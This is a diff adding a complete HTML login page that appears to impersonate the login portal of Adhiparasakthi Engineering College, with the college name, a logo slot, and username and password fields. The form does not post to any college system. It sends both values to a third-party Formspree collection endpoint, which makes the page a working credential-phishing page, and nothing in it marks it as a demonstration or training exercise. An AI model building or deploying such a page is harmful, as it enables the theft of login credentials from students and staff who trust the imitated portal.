@@ -1,1 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>College Login</title>
 
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-family:Arial;
+    background:linear-gradient(135deg,#00c6ff,#0072ff,#7b2ff7);
+}
+
+.login-box{
+    background:white;
+    width:340px;
+    padding:30px;
+    border-radius:12px;
+    text-align:center;
+    box-shadow:0 10px 25px rgba(0,0,0,0.3);
+}
+
+.logo{
+    width:90px;
+    margin-bottom:10px;
+}
+
+h2{
+    font-size:18px;
+    color:#003366;
+    margin-bottom:15px;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    margin:8px 0;
+    border:1px solid #ccc;
+    border-radius:6px;
+    outline:none;
+}
+
+button{
+    width:100%;
+    padding:10px;
+    background:#0072ff;
+    color:white;
+    border:none;
+    border-radius:6px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#0055cc;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="login-box">
+
+    <!-- COLLEGE LOGO -->
+    <img src="images (1).png" class="logo" alt="College Logo">
+
+    <h2>ADHIPARASAKTHI ENGINEERING COLLEGE</h2>
+
+    <!-- FORMSPREE FORM -->
+    <form action="https://formspree.io/f/maqglkkk" method="POST">
+
+        <!-- Username -->
+        <input type="text" name="username" placeholder="Enter Username" required>
+
+        <!-- Password -->
+        <input type="password" name="password" placeholder="Enter Password" required>
+
+        <button type="submit">Login</button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
